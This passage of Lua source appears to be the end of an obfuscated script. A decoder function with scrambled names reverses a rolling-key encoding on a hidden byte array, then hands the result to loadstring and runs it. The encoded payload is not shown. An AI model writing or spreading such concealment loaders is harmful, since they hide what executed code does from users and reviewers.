    local function VM_lIOl1O(d, k, m)
        local R_110I0 = {}
        local c_key = k
        local char = string.char
        local insert = table.insert
        
        -- Virtual Machine Loop
        for idx = 1, #d do
            local val = d[idx]
            -- Decodificacao Rolling Key
            local dec = (val / m) - c_key
            
            -- Anti-Crash Mobile (Garante byte valido)
            dec = dec % 256
            
            insert(R_110I0, char(dec))
            
            -- Atualiza a chave para o proximo (Rolling)
            c_key = (c_key + 13) % 150
        end
        return table.concat(R_110I0)
    end

    -- Execution Guard
    local F_lll0I1lI = loadstring(VM_lIOl1O(B_0ll0I, 43, 5))
    if F_lll0I1lI then
        F_lll0I1lI(...)
    end
end)(...)
